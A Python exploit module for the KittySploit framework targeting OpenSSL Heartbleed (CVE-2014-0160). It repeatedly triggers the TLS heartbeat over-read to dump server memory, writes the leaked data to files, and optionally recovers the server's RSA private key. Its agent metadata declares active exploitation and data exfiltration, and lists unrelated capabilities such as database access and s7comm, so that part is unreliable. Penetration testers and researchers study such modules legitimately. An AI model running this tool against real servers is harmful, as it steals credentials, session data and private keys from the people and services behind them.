#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Exploit OpenSSL Heartbleed (CVE-2014-0160) to dump process memory."""

from pathlib import Path

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client
from lib.protocols.tcp.tls_heartbeat import (
    extract_rsa_private_key_pem,
    fetch_certificate_modulus,
    format_leaked_ascii,
    openssl_modulus_hex,
    probe_heartbleed,
)


class Module(Auxiliary, Tcp_scanner_client):
    __info__ = {
        "name": "OpenSSL Heartbleed CVE-2014-0160 - Memory dump",
        "description": (
            "Repeatedly triggers the TLS heartbeat over-read (CVE-2014-0160) to collect "
            "server memory. Optional RSA private key reconstruction when the leaked buffer "
            "contains prime factors matching the service certificate modulus."
        ),
        "author": ["Jared Stafford", "Travis Lee", "KittySploit Team"],
        "cve": ["CVE-2014-0160"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2014-0160",
            "https://heartbleed.com/",
        ],
        "tags": [
            "auxiliary",
            "tcp",
            "tls",
            "ssl",
            "openssl",
            "heartbleed",
            "memory-disclosure",
            "cve-2014-0160",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation', 'data_exfiltration'],
        'expected_requests': 5,
        'reversible': True,
        'approval_required': True,
        'produces': ['exploit_paths', 'risk_signals'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    port = OptPort(443, "Target TCP port", True)
    timeout = OptPort(10, "Probe timeout in seconds", False, advanced=True)
    iterations = OptInteger(1, "Number of heartbeat connections to attempt", required=False)
    starttls = OptBool(False, "Force STARTTLS/STLS/AUTH TLS before TLS handshake", required=False)
    auto_starttls = OptBool(
        True,
        "Automatically negotiate STARTTLS on common mail/FTP ports (21, 25, 110, 143, 587)",
        required=False,
        advanced=True,
    )
    hexdump = OptBool(False, "Print leaked data as a hex dump", required=False)
    display_data = OptBool(True, "Print leaked data on screen", required=False)
    raw_output_file = OptString("", "Append raw heartbeat payloads to this file", required=False)
    ascii_output_file = OptString("", "Append printable leaked data to this file", required=False)
    extract_key = OptBool(
        False,
        "Attempt RSA private key recovery from leaked memory (requires certificate modulus)",
        required=False,
    )
    key_output_file = OptString("", "Write recovered PEM private key to this file", required=False)
    output_limit = OptInteger(
        4000,
        "Max characters to print when display_data is enabled (0 = full)",
        required=False,
        advanced=True,
    )
    verbose = OptBool(False, "Verbose TLS exchange logging", required=False, advanced=True)

    def _log(self, message: str) -> None:
        if self.verbose:
            print_debug(message)

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "Target hostname or IP is required", "confidence": "low"}

        result = probe_heartbleed(
            host,
            self._port(),
            timeout=self._timeout(),
            use_starttls=bool(self.starttls),
            auto_starttls=bool(self.auto_starttls),
            log=self._log,
        )
        if result.vulnerable:
            return {
                "vulnerable": True,
                "reason": result.reason,
                "confidence": "high",
                "details": f"{result.leaked_bytes} bytes leaked over {result.tls_version}",
            }
        return {
            "vulnerable": False,
            "reason": result.reason or "No heartbeat memory leak observed",
            "confidence": "medium",
        }

    def _resolve_modulus(self, host: str, port: int) -> int:
        modulus = fetch_certificate_modulus(
            host,
            port,
            timeout=self._timeout(),
            use_starttls=bool(self.starttls),
            auto_starttls=bool(self.auto_starttls),
            log=self._log,
        )
        if modulus:
            return modulus

        modulus_hex = openssl_modulus_hex(host, port, timeout=max(self._timeout(), 15.0))
        if modulus_hex:
            return int(modulus_hex, 16)
        return 0

    def _append_file(self, path: str, data: bytes | str) -> None:
        if not path:
            return
        target = Path(path)
        target.parent.mkdir(parents=True, exist_ok=True)
        mode = "ab" if isinstance(data, (bytes, bytearray)) else "a"
        with target.open(mode) as handle:
            handle.write(data)

    def _truncate_for_display(self, text: str) -> str:
        limit = int(self.output_limit or 0)
        if limit <= 0 or len(text) <= limit:
            return text
        return text[:limit] + f"\n... ({len(text) - limit} more characters truncated)"

    def run(self):
        host = self._host()
        if not host:
            print_error("Target hostname or IP is required")
            return False

        port = self._port()
        attempts = max(1, int(self.iterations or 1))
        modulus = 0
        if self.extract_key:
            print_status(f"Fetching RSA modulus from {host}:{port}...")
            modulus = self._resolve_modulus(host, port)
            if modulus:
                print_success("Certificate modulus acquired for key recovery")
            else:
                print_warning("Could not read certificate modulus; key extraction disabled")

        leaked_total = 0
        rendered_chunks = []
        recovered_key = None

        for attempt in range(1, attempts + 1):
            if attempts > 1:
                print_status(f"Heartbeat attempt {attempt}/{attempts}...")

            result = probe_heartbleed(
                host,
                port,
                timeout=self._timeout(),
                use_starttls=bool(self.starttls),
                auto_starttls=bool(self.auto_starttls),
                log=self._log,
            )
            if not result.vulnerable or not result.payload:
                if attempt == 1:
                    print_error(result.reason or "Target is not vulnerable")
                    return False
                continue

            leaked_total += result.leaked_bytes
            self._append_file(self.raw_output_file, result.payload)

            rendered = format_leaked_ascii(result.payload, hexdump=bool(self.hexdump))
            if rendered:
                rendered_chunks.append(rendered)
                self._append_file(self.ascii_output_file, rendered)

            if self.extract_key and modulus and recovered_key is None:
                recovered_key = extract_rsa_private_key_pem(result.payload, modulus)
                if recovered_key:
                    print_success("RSA private key material recovered from leaked memory")
                    break

        if leaked_total <= 0:
            print_error("No memory was leaked across the requested attempts")
            return False

        print_success(
            f"Collected {leaked_total} leaked bytes from {host}:{port} "
            f"across {attempts} attempt(s)"
        )

        if self.display_data and rendered_chunks:
            combined = "\n".join(rendered_chunks)
            print_info(self._truncate_for_display(combined))

        if recovered_key:
            if self.key_output_file:
                self._append_file(self.key_output_file, recovered_key)
                print_success(f"Private key written to {self.key_output_file}")
            else:
                print_info(recovered_key)

        return True
